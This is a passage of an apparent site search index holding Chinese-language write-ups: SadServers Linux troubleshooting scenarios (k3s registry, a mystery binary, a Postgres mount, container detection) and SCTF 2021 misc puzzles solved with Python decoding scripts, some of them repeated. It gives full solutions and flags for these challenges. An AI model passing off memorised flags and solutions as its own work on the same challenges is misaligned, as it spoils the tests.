\u7136\u540e\u68c0\u67e5\u4e00\u4e0b k3s \u5404\u90e8\u5206\u7684\u72b6\u6001\uff1a admin@ip-10-0-0-64:~$ kubectl get all -n web NAME READY STATUS RESTARTS AGE pod/webapp-deployment-666b67994b-5sffz 0/1 ImagePullBackOff 0 46d NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/webapp-service NodePort 10.43.35.97 <none> 80:30007/TCP 46d NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/webapp-deployment 0/1 1 0 46d NAME DESIRED CURRENT READY AGE replicaset.apps/webapp-deployment-666b67994b 1 1 0 46d \u53ef\u4ee5\u53d1\u73b0 webapp-deployment \u7684\u955c\u50cf\u62c9\u53d6\u5931\u8d25\u4e86\u3002\u56e0\u4e3a\u5b83\u4f1a\u4ece\u7f51\u7edc\u62c9\u53d6 webapp \u955c\u50cf\u800c\u4e0d\u662f\u672c\u5730\uff0c\u800c\u6574\u4e2a sadservers \u4e0d\u80fd\u8fde\u63a5\u5916\u90e8\u7f51\u7edc\uff0c\u6240\u4ee5\u81ea\u7136\u4f1a\u62c9\u53d6\u5931\u8d25\u3002 \u8fd9\u4e2a\u72b6\u6001\u548c\u524d\u4e00\u9635\u529e ZJUCTF \u6821\u8d5b\u5f88\u50cf\uff0c\u5927\u6982\u5c31\u662f k3s \u62c9\u53d6\u955c\u50cf\u7684\u95ee\u9898\u3002\u5f53\u65f6\u662f\u81ea\u5efa\u4e86\u4e00\u4e2a registry \u6765\u641e\u7684\u3002\u6240\u4ee5\u67e5\u4e00\u4e0b\u672c\u5730\u7684\u955c\u50cf\uff1a admin@ip-10-0-0-64:~$ sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZE webapp latest 9c082e2983bc 6 weeks ago 135MB python 3.7-slim c1d0bab51bbf 7 weeks ago 123MB registry 2 3a0f7b0a13ef 2 months ago 24.1MB \u53d1\u73b0\u6b63\u597d\u6709 registry \u955c\u50cf\u3002\u6240\u4ee5\u672c\u5730\u8d77\u4e00\u4e2a registry \u7136\u540e\u5c06 webapp \u4e0a\u4f20\uff1a admin@ip-10-0-0-64:~$ sudo docker run -d -p 5000:5000 registry:2 ... admin@ip-10-0-0-64:~$ sudo docker tag webapp localhost:5000/webapp admin@ip-10-0-0-64:~$ sudo docker push localhost:5000/webapp Using default tag: latest The push refers to repository [localhost:5000/webapp] ... \u7136\u540e\u6539\u4e00\u4e0b deployment.yml\uff1a ... template : metadata : labels : app : webapp spec : containers : - name : webapp image : localhost:5000/webapp # \u8fd9\u91cc imagePullPolicy : Always ports : - containerPort : 8888 # \u548c\u8fd9\u91cc \u7136\u540e\u5e94\u7528\uff1a admin@ip-10-0-0-64:~$ kubectl apply -f deployment.yml deployment.apps/webapp-deployment configured admin@ip-10-0-0-64:~$ kubectl get pods -n web NAME READY STATUS RESTARTS AGE webapp-deployment-666b67994b-5sffz 0/1 Terminating 0 46d webapp-deployment-8f869f757-g2m7n 1/1 Running 0 12s \u53ef\u4ee5\u53d1\u73b0\u6210\u529f\u542f\u52a8\u4e86\uff0c\u63a5\u4e0b\u6765\u7684\u5c31\u662f\u5c06\u5176\u4e2d\u7684 8888 \u7aef\u53e3\u8f6c\u53d1\u51fa\u6765\uff1a admin@ip-10-0-0-64:~$ kubectl port-forward deployments/webapp-deployment 8888 -n web & Forwarding from 127.0.0.1:8888 -> 8888 Forwarding from [::1]:8888 -> 8888 ... \u7136\u540e\u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u91cc curl localhost:8888 \u5c31\u53ef\u4ee5\u5f97\u5230\u6b63\u5e38\u7ed3\u679c\u4e86\u3002","title":"\"Singara\""},{"location":"writeups/sadservers/#karakorum","text":"Scenario: \"Karakorum\": WTFIT \u2013 What The Fun Is This? Level: Hard Description: There's a binary at /home/admin/wtfit that nobody knows how it works or what it does (\"what the fun is this\"). Someone remembers something about wtfit needing to communicate to a service in order to start. Run this wtfit program so it doesn't exit with an error, fixing or working around things that you need but are broken in this server. (Note that you can open more than one web \"terminal\"). OS: Debian 11 ls -l \u53ef\u4ee5\u770b\u51fa\u6765 wtfit \u6ca1\u6709\u8fd0\u884c\u6743\u9650\u3002\u6240\u4ee5\u5148 chmod\uff0c\u4f46 chmod \u4f1a\u62a5\u9519 bash: /usr/bin/chmod: Permission denied\u3002\u7ecf\u8fc7\u68c0\u67e5\u53ef\u4ee5\u53d1\u73b0\u662f /usr/bin/chmod \u81ea\u8eab\u4e5f\u6ca1\u6709\u8fd0\u884c\u6743\u9650\uff1a admin@ip-172-31-46-91:/$ ls -l /usr/bin/chmod -rw-r--r-- 1 root root 64448 Sep 24 2020 /usr/bin/chmod \u53ef\u4ee5\u641c\u7d22\u5230 \u4e00\u4e9b\u89e3\u51b3\u529e\u6cd5 \uff1a admin@ip-172-31-46-91:/$ sudo su root@ip-172-31-46-91:/# /lib64/ld-linux-x86-64.so.2 /bin/chmod 755 /bin/chmod root@ip-172-31-46-91:/# cd /home/admin/ root@ip-172-31-46-91:/home/admin# chmod +x wtfit \u8fd0\u884c wtfit \u51fa\u9519\uff1aERROR: can't open config file\u3002\u6839\u636e\u63d0\u793a\u901a\u8fc7 strace \u6765\u8ddf\u8e2a\u5f97\u5230\u9519\u8bef\u7684\u8be6\u7ec6\u6d88\u606f\uff1a admin@ip-172-31-46-91:~$ strace ./wtfit ... openat(AT_FDCWD, \"/home/admin/wtfitconfig.conf\", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) ... \u5728\u8fd9\u4e2a\u4f4d\u7f6e\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u914d\u7f6e\u6587\u4ef6\u3002\u7136\u540e\u518d\u8fd0\u884c\uff0c\u8fd8\u662f\u51fa\u9519\uff1aERROR: can't connect to server\u3002\u540c\u6837 strace \u53ef\u4ee5\u5f97\u5230\uff1a admin@ip-172-31-46-91:~$ strace ./wtfit ... connect(3, {sa_family=AF_INET, sin_port=htons(7777), sin_addr=inet_addr(\"127.0.0.1\")}, 16) = -1 EINPROGRESS (Operation now in progress) ... \u6240\u4ee5\u53ef\u4ee5\u770b\u51fa\u5b83\u5728\u8bd5\u56fe\u8fde\u63a5 localhost:7777\u3002\u5f00\u4e00\u4e2a\u65b0\u7684 terminal \u7136\u540e\u76d1\u542c\u4e00\u4e0b 7777 \u7aef\u53e3\uff0c\u8fd0\u884c wtfit\uff1a admin@ip-172-31-46-91:/$ nc -lvvp 7777 Listening on 0.0.0.0 7777 Connection received on localhost 54756 GET / HTTP/1.1 Host: localhost:7777 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip \u53ef\u4ee5\u53d1\u73b0\u5c31\u662f\u7b80\u5355\u7684 GET\uff0c\u6240\u4ee5 python \u8d77\u4e00\u4e2a http server\uff0c\u7136\u540e\u8fd0\u884c\uff1a admin@ip-172-31-46-91:/$ python3 -m http.server 7777 Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ... 127.0.0.1 - - [03/Nov/2022 12:58:30] \"GET / HTTP/1.1\" 200 - \u8fd9\u65f6 wtfit \u5c31\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u7ed3\u675f\u4e86\u3002","title":"\"Karakorum\""},{"location":"writeups/sadservers/#hong-kong","text":"Scenario: \"Hong-Kong\": can't write data into database. Level: Hard Description: (Similar to \"Manhattan\" scenario but harder). Your objective is to be able to insert a row in an existing Postgres database. The issue is not specific to Postgres and you don't need to know details about it (although it may help). Postgres information: it's a service that listens to a port (:5432) and writes to disk in a data directory, the location of which is defined in the data_directory parameter of the configuration file /etc/postgresql/14/main/postgresql.conf. In our case Postgres is managed by systemd as a unit with name postgresql. OS: Debian 10 \u548c\u524d\u9762\u7684 \"Manhattan\" \u7c7b\u4f3c\u3002\u8fd8\u662f\u5148\u68c0\u67e5\u72b6\u6001\u6ca1\u5f02\u5e38\uff0c\u91cd\u542f\u6ca1\u5f02\u5e38\uff0c\u67e5\u770b /var/log/syslog\uff0c\u53d1\u73b0\uff1a Nov 3 11:52:20 ip-172-31-25-11 systemd[1]: Starting PostgreSQL Cluster 14-main... Nov 3 11:52:20 ip-172-31-25-11 postgresql@14-main[1318]: Error: /opt/pgdata/main is not accessible or does not exist Nov 3 11:52:20 ip-172-31-25-11 systemd[1]: postgresql@14-main.service: Can't open PID file /run/postgresql/14-main.pid (yet?) after start: No such file or directory Nov 3 11:52:20 ip-172-31-25-11 systemd[1]: postgresql@14-main.service: Failed with result 'protocol'. Nov 3 11:52:20 ip-172-31-25-11 systemd[1]: Failed to start PostgreSQL Cluster 14-main. \u627e\u4e0d\u5230 /opt/pgdata/main\uff0cls \u4e00\u4e0b /opt/pgdata \u4e5f\u6ca1\u6709\u3002\u518d\u5f80\u524d\u770b syslog \u53ef\u4ee5\u53d1\u73b0\uff1a Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: dev-xvdb.device: Job dev-xvdb.device/start timed out. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: Timed out waiting for device /dev/xvdb. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: Dependency failed for /opt/pgdata. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Job opt-pgdata.mount/start failed with result 'dependency'. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: Startup finished in 2.669s (kernel) + 1min 31.106s (userspace) = 1min 33.776s. Nov 3 11:47:54 ip-172-31-25-11 systemd[1]: dev-xvdb.device: Job dev-xvdb.device/start failed with result 'timeout'. \u53ef\u4ee5\u53d1\u73b0\u6302\u8f7d\u8bbe\u5907\u8d85\u65f6\u4e86\u3002 fdisk \u770b\u4e00\u4e0b\uff1a root@ip-172-31-25-11:/# fdisk -l Disk /dev/nvme0n1: 8 GiB, 8589934592 bytes, 16777216 sectors Disk model: Amazon Elastic Block Store Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/nvme1n1: 8 GiB, 8589934592 bytes, 16777216 sectors Disk model: Amazon Elastic Block Store Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: 56507B41-5D22-1349-81AD-C628BA074922 Device Start End Sectors Size Type /dev/nvme1n1p1 262144 16777182 16515039 7.9G Linux filesystem /dev/nvme1n1p14 2048 8191 6144 3M BIOS boot /dev/nvme1n1p15 8192 262143 253952 124M EFI System Partition table entries are not in disk order. root@ip-172-31-25-11:/# df Filesystem 1K-blocks Used Available Use% Mounted on udev 228728 0 228728 0% /dev tmpfs 47568 1524 46044 4% /run /dev/nvme1n1p1 8026128 1230452 6366420 17% / tmpfs 237828 0 237828 0% /dev/shm tmpfs 5120 0 5120 0% /run/lock tmpfs 237828 0 237828 0% /sys/fs/cgroup /dev/nvme1n1p15 126710 278 126432 1% /boot/efi \u53ef\u4ee5\u53d1\u73b0 /dev/nvme0n1 \u6ca1\u6709\u6302\u8f7d\u4e0a\uff0c\u6839\u636e\u524d\u9762\u9898\u76ee\u53ef\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u8bbe\u5907\u91cc\u9762\u662f /opt/pgdata \u7684\u5185\u5bb9\u3002 mount /dev/nvme0n1 /opt/pgdata \u5c1d\u8bd5\u6302\u8f7d\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u4f46\u4ecd\u65e7\u6ca1\u6709\u4e1c\u897f\u3002\u770b\u4e00\u4e0b /var/log/syslog \u53d1\u73b0\uff1a Nov 3 12:02:06 ip-172-31-25-11 kernel: [ 945.914667] SGI XFS with ACLs, security attributes, realtime, no debug enabled Nov 3 12:02:06 ip-172-31-25-11 kernel: [ 945.925395] XFS (nvme0n1): Mounting V5 Filesystem Nov 3 12:02:07 ip-172-31-25-11 kernel: [ 946.092049] XFS (nvme0n1): Ending clean mount Nov 3 12:02:07 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Unit is bound to inactive unit dev-xvdb.device. Stopping, too. Nov 3 12:02:07 ip-172-31-25-11 systemd[1]: Unmounting /opt/pgdata... Nov 3 12:02:07 ip-172-31-25-11 kernel: [ 946.124665] XFS (nvme0n1): Unmounting Filesystem Nov 3 12:02:07 ip-172-31-25-11 systemd[1]: opt-pgdata.mount: Succeeded. Nov 3 12:02:07 ip-172-31-25-11 systemd[1]: Unmounted /opt/pgdata. \u53ef\u4ee5\u770b\u51fa systemd \u4e0d\u8ba9\u6211\u4eec\u6302\u8f7d\u5230 /opt/pgdata \u4e0a\uff0c\u56e0\u4e3a\u5b83\u548c /dev/xvdb \u8bbe\u5907\u5173\u8054\u4e86\u3002\u8fd9\u4e2a\u5173\u8054\u662f\u5728 /etc/fstab \u6587\u4ef6\u4e2d\u7684\uff1a # /etc/fstab: static file system information UUID=5db68868-2d70-449f-8b1d-f3c769ec01c7 / ext4 rw,discard,errors=remount-ro,x-systemd.growfs 0 1 UUID=72C9-F191 /boot/efi vfat defaults 0 0 /dev/xvdb /opt/pgdata xfs defaults,nofail 0 0 \u628a\u91cc\u9762\u7684 /dev/xvdb \u6362\u6210 /dev/nvme0n1\uff0c\u7136\u540e systemctl daemon-reload \u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u6b63\u5e38 mount \u4e86\uff1a root@ip-172-31-25-11:/# systemctl daemon-reload root@ip-172-31-25-11:/# ls /opt/pgdata root@ip-172-31-25-11:/# mount /dev/nvme0n1 /opt/pgdata root@ip-172-31-25-11:/# ls /opt/pgdata deleteme file1.bk file2.bk file3.bk main \u540c\u6837\uff0c\u8fd9\u4e9b .bk \u6587\u4ef6\u5360\u6ee1\u4e86\u7a7a\u95f4\uff0c\u5220\u6389\u7136\u540e\u91cd\u542f postgresql\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u4f7f\u7528\u4e86\uff1a root@ip-172-31-25-11:/# ls -l /opt/pgdata total 8285620 -rw-r--r-- 1 root root 69 May 21 22:20 deleteme -rw-r--r-- 1 root root 7516192768 May 21 22:06 file1.bk -rw-r--r-- 1 root root 967774208 May 21 22:17 file2.bk -rw-r--r-- 1 root root 499712 May 21 22:23 file3.bk drwx------ 19 postgres postgres 4096 May 21 22:24 main root@ip-172-31-25-11:/# rm /opt/pgdata/file*.bk root@ip-172-31-25-11:/# sudo systemctl start postgresql root@ip-172-31-25-11:/# sudo -u postgres psql -c \"insert into persons(name) values ('jane smith');\" -d dt INSERT 0 1","title":"\"Hong-Kong\""},{"location":"writeups/sadservers/#venice","text":"Scenario: \"Venice\": Am I in a container? Level: Medium Description: Try and figure out if you are inside a container (like a Docker one for example) or inside a Virtual Machine (like in the other scenarios). OS: Debian 11 emmm\uff0cps -aux \u770b\u5230\uff1a root@ip-172-31-33-228:/# ps -aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.4 2.0 100712 9600 ? Ss 12:14 0:01 /sbin/init root 22 0.0 1.4 26728 6912 ? Ss 12:14 0:00 /lib/systemd/systemd-journald message+ 47 0.0 0.7 8268 3700 ? Ss 12:14 0:00 /usr/bin/dbus-daemon --system --addres root 49 0.0 1.1 13404 5532 ? Ss 12:14 0:00 /lib/systemd/systemd-logind root 71 0.0 2.4 1230092 11584 ? S<sl 12:14 0:00 /usr/local/gotty --permit-write --reco root 91 0.0 0.7 6056 3652 pts/0 S<s 12:18 0:00 bash root 92 0.0 0.7 8840 3416 pts/0 R<+ 12:18 0:00 ps -aux \u548c\u5176\u5b83\u9898\u76ee\u5b9e\u4f8b\u91cc\u9762\u4e0d\u4e00\u6837\uff0c\u6ca1\u6709 kernel thread\uff0c\u6240\u4ee5\u662f\u5bb9\u5668\u800c\u4e0d\u662f\u865a\u62df\u673a\u3002\uff08\u5c31\u8fd9\uff1f \u9898\u7ed9\u7b54\u6848 Solution: This is in fact a Podman container :-) You can get the image: docker.io/fduran/venice. A way of checking is by looking at the environment of the PID=1 process and see if there's a container variable, for ex: cat /proc/1/environ|tr \"\\0\" \"\\n\"|grep container , in our case would be container=podman but I changed its value. An indicator is to look at the running processes and see that there are no kernel threads like [kthreadd].","title":"\"Venice\""},{"location":"writeups/sctf2021/","text":"SCTF 2021 Writeup \u00b6 Abstract \u8fd9\u573a\u6bd4\u8d5b\u7684 misc \u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u6709\u533a\u5757\u94fe\u6709\u7269\u8054\u7f51\u8fd8\u6709\u9006\u5411\uff0c\u8fd9\u91cc\u5c31\u653e\u4e00\u4e0b\u4e09\u9053\u201c\u5e38\u89c4\u201d\u7684 misc \u7684 writeup \u4e86 This_is_A_tree \u00b6 \u904d\u5386\u6587\u4ef6\u5939\u6811\uff0c\u5f97\u5230\u4e00\u4e32 base64\uff0c\u7136\u540e\u662f\u516d\u5341\u56db\u5366\u8f6c base64 \u7136\u540e\u89e3\u7801 from base64 import * import os import string def read ( path ): return open ( path , \"r\" ) . read () res = [] l = \"letf/\" r = \"Right/\" def readdir ( path ): if os . path . isfile ( path + \"data\" ): res . append ( path + \"data\" ) if os . path . isdir ( path + l ): readdir ( path + l ) if os . path . isdir ( path + r ): readdir ( path + r ) def get_tree (): readdir ( \"./src/\" ) s = \"\" for i in res : s += read ( i ) print ( b64decode ( s ) . decode ()) # Chinese traditional culture is broad and profound! # So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!: # \u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b b64table = string . ascii_uppercase + string . ascii_lowercase + string . digits + '+/' table = { '\u5764' : '000000' , '\u5265' : '000001' , '\u6bd4' : '000010' , '\u89c2' : '000011' , '\u8c6b' : '000100' , '\u664b' : '000101' , '\u8403' : '000110' , '\u5426' : '000111' , '\u8c26' : '001000' , '\u826e' : '001001' , '\u8e47' : '001010' , '\u6e10' : '001011' , '\u5c0f\u8fc7' : '001100' , '\u65c5' : '001101' , '\u54b8' : '001110' , '\u9041' : '001111' , '\u5e08' : '010000' , '\u8499' : '010001' , '\u574e' : '010010' , '\u6da3' : '010011' , '\u89e3' : '010100' , '\u672a\u6d4e' : '010101' , '\u56f0' : '010110' , '\u8bbc' : '010111' , '\u5347' : '011000' , '\u86ca' : '011001' , '\u4e95' : '011010' , '\u5dfd' : '011011' , '\u6052' : '011100' , '\u9f0e' : '011101' , '\u5927\u8fc7' : '011110' , '\u59e4' : '011111' , '\u590d' : '100000' , '\u9890' : '100001' , '\u5c6f' : '100010' , '\u76ca' : '100011' , '\u9707' : '100100' , '\u566c\u55d1' : '100101' , '\u968f' : '100110' , '\u65e0\u5984' : '100111' , '\u660e\u5937' : '101000' , '\u8d32' : '101001' , '\u65e2\u6d4e' : '101010' , '\u5bb6\u4eba' : '101011' , '\u4e30' : '101100' , '\u79bb' : '101101' , '\u9769' : '101110' , '\u540c\u4eba' : '101111' , '\u4e34' : '110000' , '\u635f' : '110001' , '\u8282' : '110010' , '\u4e2d\u5b5a' : '110011' , '\u5f52\u59b9' : '110100' , '\u777d' : '110101' , '\u5151' : '110110' , '\u5c65' : '110111' , '\u6cf0' : '111000' , '\u5927\u755c' : '111001' , '\u9700' : '111010' , '\u5c0f\u755c' : '111011' , '\u5927\u58ee' : '111100' , '\u5927\u6709' : '111101' , '\u592c' : '111110' , '\u4e7e' : '111111' } index = '\u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b' . split ( ' ' ) s = '' . join ([ b64table [ int ( table [ i ], base = 2 )] for i in index ]) print ( b64decode ( s + '=' )) # b'Ch1nA_yyds!' fumo_xor_cli \u00b6 \u53d1\u73b0\u6709\u4e24\u5e27\u753b\u9762\u662f\u6df7\u4e71\u7684\u989c\u8272\uff0c\u5176\u4e2d\u4e00\u5e27\u662f a\uff0c\u4e00\u5e27\u662f 9 \u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6 \u628a\u91cc\u9762\u6240\u6709\u7684 9 \u90fd\u5220\u6389\uff0c\u7136\u540e cat\uff1a \u5f97\u5230\uff1a https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA \u627e\u5230\u56fe\u7247\uff1a https://imgtu.com/i/TpMSkq \u56fe\u7247\u91cc\u50cf\u7d20\u70b9\u6bcf 9*9 \u4e00\u4e2a\uff0c\u4e00\u5171\u6709 100*133 \u4e2a\u70b9\uff0c\u63d0\u53d6\u51fa\u6765\uff1a from PIL import Image img = Image . open ( \"TpMSkq.png\" ) res = Image . new ( \"RGBA\" , ( 101 , 134 )) width , height = img . size print ( width , height ) print ( img . getpixel (( 800 , 1000 ))) for i in range ( width ): for j in range ( height ): if i % 9 == 1 and j % 9 == 1 : pix = img . getpixel (( i , j )) res . putpixel (( i // 9 , j // 9 ), pix ) res . save ( \"in_pix.png\" ) CLI \u91cc\u6df7\u4e71\u7684\u8fd8\u6709\u4e00\u58069\uff08\u5728\u94fe\u63a5\u540e\u9762\uff09\uff0c\u628a\u5b83\u548c\u94fe\u63a5\u5171\u540c\u7684\u4e00\u5e27\u4e5f\u7559\u4e0b\u653e\u5230 fumo_9.txt \u4e2d\uff0c\u63d0\u53d6\u51fa\u989c\u8272\u5bfc\u51fa\u56fe\u7247\uff1a from PIL import Image import re img = Image . new ( \"RGBA\" , ( 101 , 134 )) pattern = re . compile ( r '\\[38;2;(\\d+?);(\\d+?);(\\d+?)m.' ) with open ( \"fumo_a.txt\" , \"r\" ) as f : for i in range ( 50 ): line = f . readline () . strip () res = pattern . findall ( line ) for j in range ( 133 ): img . putpixel (( i + 50 , j ), tuple ( int ( res [ j ][ k ]) for k in range ( 3 ))) with open ( \"fumo_9.txt\" , \"r\" ) as f : for i in range ( 50 ): line = f . readline () . strip () res = pattern . findall ( line ) for j in range ( 133 ): img . putpixel (( i , j ), tuple ( int ( res [ j ][ k ]) for k in range ( 3 ))) img . save ( \"cli.png\" ) \u7136\u540e fumo \u4e2d\u63d0\u51fa\u7684\u56fe\u548c cli \u63d0\u51fa\u7684\u56fe xor \u5f97\u5230\uff1a \u6ca1\u6709\u6570\u5b57\uff0c\u6240\u4ee5 flag \u662f\uff1a SCTF{Good_FuMo_CTF_OvO} in_the_vaporwaves \u00b6 \u542c\u8d77\u6765\u4e2d\u95f4\u6709\u4e00\u6bb5\u611f\u89c9\u4e0d\u592a\u548c\u8c10\uff0c\u628a\u5de6\u53f3\u58f0\u9053\u7684\u9891\u8c31\u56fe xor \u4e86\u4e00\u4e0b\uff1a \u53d1\u73b0\u53ef\u80fd\u4e2d\u95f4\u6709\u641e\u4e8b\u60c5\uff0c\u53c8\u7ec6\u770b\u5bf9\u6bd4\u4e86\u4e00\u4e0b\u5de6\u53f3\u58f0\u9053\u7684\u6ce2\u5f62\u56fe\uff0c\u53d1\u73b0\u4e2d\u95f4\u5dee\u8ddd\u8f83\u5927 wave \u63d0\u53d6\u6570\u636e\uff0c\u5de6\u53f3\u58f0\u9053\u76f8\u52a0\uff1a import wave import numpy as np import matplotlib.pyplot as plt wav = wave . open ( \"c.wav\" , \"r\" ) nframes = wav . getnframes () framerate = wav . getframerate () data = wav . readframes ( nframes ) wav . close () wave_data = np . fromstring ( data , dtype = np . short ) wave_data . shape = - 1 , 2 wave_data = wave_data . T time = np . arange ( 0 , nframes ) * ( 1.0 / framerate ) res = wave_data [ 0 ] + wave_data [ 1 ] plt . figure () # plt.plot(time, res) plt . plot ( time [ 87 * framerate : 128 * framerate ], res [ 87 * framerate : 128 * framerate ]) plt . show () \u4ece\u5f00\u5934\u4e09\u4e2a\u77ed\u7ad6\u7ebf\u53ef\u4ee5\u63a8\u6d4b\u662f\u6469\u5c14\u65af\u7535\u7801\u8f6c\u6362\u7684 SCTF \u5f00\u5934\uff0c\u957f\u77ed\u6284\u4e0b\u6765\u7136\u540e\u6469\u5c14\u65af\u89e3\u7801\uff0c\u5f97\u5230 flag ... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ... SCTFDES1R3_DRIVES_INT0_VAPORW@VES flag: SCTF{DES1R3_DRIVES_INT0_VAPORW@VES}","title":"SCTF 2021"},{"location":"writeups/sctf2021/#sctf-2021-writeup","text":"Abstract \u8fd9\u573a\u6bd4\u8d5b\u7684 misc \u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u6709\u533a\u5757\u94fe\u6709\u7269\u8054\u7f51\u8fd8\u6709\u9006\u5411\uff0c\u8fd9\u91cc\u5c31\u653e\u4e00\u4e0b\u4e09\u9053\u201c\u5e38\u89c4\u201d\u7684 misc \u7684 writeup \u4e86","title":"SCTF 2021 Writeup"},{"location":"writeups/sctf2021/#this_is_a_tree","text":"\u904d\u5386\u6587\u4ef6\u5939\u6811\uff0c\u5f97\u5230\u4e00\u4e32 base64\uff0c\u7136\u540e\u662f\u516d\u5341\u56db\u5366\u8f6c base64 \u7136\u540e\u89e3\u7801 from base64 import * import os import string def read ( path ): return open ( path , \"r\" ) . read () res = [] l = \"letf/\" r = \"Right/\" def readdir ( path ): if os . path . isfile ( path + \"data\" ): res . append ( path + \"data\" ) if os . path . isdir ( path + l ): readdir ( path + l ) if os . path . isdir ( path + r ): readdir ( path + r ) def get_tree (): readdir ( \"./src/\" ) s = \"\" for i in res : s += read ( i ) print ( b64decode ( s ) . decode ()) # Chinese traditional culture is broad and profound! # So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!: # \u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b b64table = string . ascii_uppercase + string . ascii_lowercase + string . digits + '+/' table = { '\u5764' : '000000' , '\u5265' : '000001' , '\u6bd4' : '000010' , '\u89c2' : '000011' , '\u8c6b' : '000100' , '\u664b' : '000101' , '\u8403' : '000110' , '\u5426' : '000111' , '\u8c26' : '001000' , '\u826e' : '001001' , '\u8e47' : '001010' , '\u6e10' : '001011' , '\u5c0f\u8fc7' : '001100' , '\u65c5' : '001101' , '\u54b8' : '001110' , '\u9041' : '001111' , '\u5e08' : '010000' , '\u8499' : '010001' , '\u574e' : '010010' , '\u6da3' : '010011' , '\u89e3' : '010100' , '\u672a\u6d4e' : '010101' , '\u56f0' : '010110' , '\u8bbc' : '010111' , '\u5347' : '011000' , '\u86ca' : '011001' , '\u4e95' : '011010' , '\u5dfd' : '011011' , '\u6052' : '011100' , '\u9f0e' : '011101' , '\u5927\u8fc7' : '011110' , '\u59e4' : '011111' , '\u590d' : '100000' , '\u9890' : '100001' , '\u5c6f' : '100010' , '\u76ca' : '100011' , '\u9707' : '100100' , '\u566c\u55d1' : '100101' , '\u968f' : '100110' , '\u65e0\u5984' : '100111' , '\u660e\u5937' : '101000' , '\u8d32' : '101001' , '\u65e2\u6d4e' : '101010' , '\u5bb6\u4eba' : '101011' , '\u4e30' : '101100' , '\u79bb' : '101101' , '\u9769' : '101110' , '\u540c\u4eba' : '101111' , '\u4e34' : '110000' , '\u635f' : '110001' , '\u8282' : '110010' , '\u4e2d\u5b5a' : '110011' , '\u5f52\u59b9' : '110100' , '\u777d' : '110101' , '\u5151' : '110110' , '\u5c65' : '110111' , '\u6cf0' : '111000' , '\u5927\u755c' : '111001' , '\u9700' : '111010' , '\u5c0f\u755c' : '111011' , '\u5927\u58ee' : '111100' , '\u5927\u6709' : '111101' , '\u592c' : '111110' , '\u4e7e' : '111111' } index = '\u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b' . split ( ' ' ) s = '' . join ([ b64table [ int ( table [ i ], base = 2 )] for i in index ]) print ( b64decode ( s + '=' )) # b'Ch1nA_yyds!'","title":"This_is_A_tree"},{"location":"writeups/sctf2021/#fumo_xor_cli","text":"\u53d1\u73b0\u6709\u4e24\u5e27\u753b\u9762\u662f\u6df7\u4e71\u7684\u989c\u8272\uff0c\u5176\u4e2d\u4e00\u5e27\u662f a\uff0c\u4e00\u5e27\u662f 9 \u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6 \u628a\u91cc\u9762\u6240\u6709\u7684 9 \u90fd\u5220\u6389\uff0c\u7136\u540e cat\uff1a \u5f97\u5230\uff1a https://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA \u627e\u5230\u56fe\u7247\uff1a https://imgtu.com/i/TpMSkq \u56fe\u7247\u91cc\u50cf\u7d20\u70b9\u6bcf 9*9 \u4e00\u4e2a\uff0c\u4e00\u5171\u6709 100*133 \u4e2a\u70b9\uff0c\u63d0\u53d6\u51fa\u6765\uff1a from PIL import Image img = Image . open ( \"TpMSkq.png\" ) res = Image . new ( \"RGBA\" , ( 101 , 134 )) width , height = img . size print ( width , height ) print ( img . getpixel (( 800 , 1000 ))) for i in range ( width ): for j in range ( height ): if i % 9 == 1 and j % 9 == 1 : pix = img . getpixel (( i , j )) res . putpixel (( i // 9 , j // 9 ), pix ) res . save ( \"in_pix.png\" ) CLI \u91cc\u6df7\u4e71\u7684\u8fd8\u6709\u4e00\u58069\uff08\u5728\u94fe\u63a5\u540e\u9762\uff09\uff0c\u628a\u5b83\u548c\u94fe\u63a5\u5171\u540c\u7684\u4e00\u5e27\u4e5f\u7559\u4e0b\u653e\u5230 fumo_9.txt 